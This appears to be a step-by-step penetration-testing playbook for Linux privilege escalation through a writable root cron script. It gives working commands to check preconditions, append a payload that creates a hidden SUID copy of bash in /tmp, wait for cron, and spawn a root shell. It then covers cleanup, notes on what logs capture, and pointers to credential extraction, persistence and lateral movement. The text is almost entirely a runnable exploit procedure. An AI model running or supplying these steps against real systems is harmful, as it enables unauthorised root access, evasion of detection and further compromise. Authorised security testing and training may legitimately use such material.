
⚠️ **Hard preconditions — verified in Step 1.**

- **A cron entry exists** that invokes a script writable by the current user.
- **Cron will execute within the operator's time budget.** Schedule must be tight enough for live exploitation — typically `* * * * *` or minutes-scale. Daily/weekly/monthly schedules require persistence-window planning.
- **`<cron_user>` is the UID-0 account verified in Step 1.** Commands assume root; if `<cron_user>` is non-root, Step 5 yields that user's privileges (lateral outcome only, not root).
- **Destructive without backup.** Step 3 modifies the cron-controlled script in place. Step 2 takes a backup if the script is readable; without that, original content cannot be recovered.
- **Cron-script assumption.** Walkthrough assumes the cron entry invokes a shell script (sh/bash). Binary cron targets (rare) require overwriting rather than appending — out of scope here.

---

## Step 1 — Preflight

⚠️ `<script>` is the path from `WRITABLE_SCRIPT[root]: <path>` in [[Linux Privilege Escalation Checksheet]] Step 3. If unknown, return there first.

##### Confirm writability of `<script>` — the absolute path to the cron-invoked script:

`test -w <script> && echo "WRITABLE" || echo "NOT WRITABLE"`

- `WRITABLE` → proceed
- `NOT WRITABLE` → walkthrough doesn't apply; return to Checksheet

##### Identify `<cron_user>` and `<cron_interval>`:

If `<script>` is in `/etc/cron.daily/`, `/etc/cron.hourly/`, `/etc/cron.weekly/`, or `/etc/cron.monthly/` → `<cron_user>` is `root` and `<cron_interval>` is the directory's fixed schedule.

Otherwise:

`grep -h "$(basename <script>)" /etc/crontab /etc/cron.d/* 2>/dev/null`

**Note field 6 as `<cron_user>`. Note fields 1–5 as `<cron_interval>`**.

##### Confirm `<script>` is a shell script, not a binary: 

`file <script>` 

- Output contains `shell script` or `ASCII text` → proceed. 
- Output contains `ELF` or `binary` → walkthrough doesn't apply; binary cron targets require overwriting, not appending — out of scope.
##### Confirm UID 0 for `<cron_user>`:

`awk -F: -v u="<cron_user>" '$1 == u && $3 == 0' /etc/passwd`

- Line returned → `<cron_user>` is UID 0; full root achieved at Step 5
- No output → `<cron_user>` is non-root; Step 5 lands in that user's context (lateral-only outcome)

---

## Step 2 — Backup the script (conditional on readability)

⚠️ Run `stty cols 220` before pasting. Line-wrap in a narrow reverse shell will silently corrupt this command.

`test -r <script> && install -m 600 <script> /tmp/.cron_script.bak && echo "BACKUP CREATED" || echo "NO BACKUP — destructive"`

- `BACKUP CREATED` → restoration available at Step 6 cleanup. Proceed.
- `NO BACKUP — destructive` → script not readable to current user (unusual when also writable); original cannot be restored. Proceed.

---

## Step 3 — Append payload to script

`printf '\ncp /bin/bash /tmp/.update && chmod +s /tmp/.update\n' >> <script>`

Verify the append:

`tail -1 <script>`

- Output is `cp /bin/bash /tmp/.update && chmod +s /tmp/.update` → payload installed. Proceed.
- Output differs → printf failed or redirection mistargeted. Re-check command.

---

## Step 4 — Wait for cron execution

Cron's resolution is 1 minute. Earliest execution: at the next minute boundary matching `<cron_interval>`.

For `* * * * *` wait up to 60 seconds. For `*/5 * * * *` wait up to 5 minutes. Scale accordingly.

Verify:

`ls -la /tmp/.update`

- Output shows owner `root` AND mode contains `s` (e.g. `-rwsr-sr-x`) → payload executed by cron as root. Proceed to Step 5.
- File doesn't exist → cron hasn't run yet (wait longer), cron daemon not running, or script failed before reaching the payload line (re-check Step 3's tail output).
- File exists but owner is not root → `<cron_user>` is not root despite Step 1's check. Re-verify Step 1.

---

## Step 5 — Elevate

`/tmp/.update -p`

`id`

- Output contains `euid=0(root)` → root achieved. Effective UID is 0; real UID remaining as the original user is expected for SUID bash with `-p`. Proceed to Step 6.
- `euid` is not 0 → `<cron_user>` was non-root (lateral outcome) or SUID bit didn't take effect (re-check Step 4's ls output).

---

## Step 6 — Cleanup

⚠️ Run `stty cols 220` before running the below commands. Line-wrap in a narrow reverse shell can silently corrupt shell behaviour.

All commands below run from the root shell:

##### Restore script:

⚠️ `clear;` is included in the command below as it fires immediately on Enter, wiping any line-wrap display corruption before output prints.

`clear; test -f /tmp/.cron_script.bak && cp /tmp/.cron_script.bak <script> && rm /tmp/.cron_script.bak && echo "RESTORED, BACKUP REMOVED" || echo "NO BACKUP TO RESTORE"`

- `RESTORED, BACKUP REMOVED` → script contents restored; backup file removed -> proceed to **Remove SUID artifact**.
- `NO BACKUP TO RESTORE` → no backup was taken at Step 2; **proceed to Fallback below**.

##### Fallback 

`sed -i '/^cp \/bin\/bash \/tmp\/\.update && chmod +s \/tmp\/\.update$/d' <script>`

##### Remove SUID artifact:

`rm /tmp/.update`

⚠️ The cron job continues running on its schedule. SUID exec doesn't generate an auth.log entry (kernel-level EUID change, not authentication). Cron logs capture each script run via `grep CRON /var/log/syslog` (Debian/Ubuntu) or `/var/log/cron` (RHEL/CentOS); log cleanup is out of scope.

---

## Decision

Root shell achieved. Next steps are goal-dependent; common destinations:

- Credential extraction (additional users' hashes, SSH keys, app secrets) → [[Linux Credential Extraction Checksheet]]
- Persistence (SSH key, cron, systemd) → [[Linux Persistence Checksheet]]
- Lateral movement → [[Linux Lateral Movement Checksheet]]
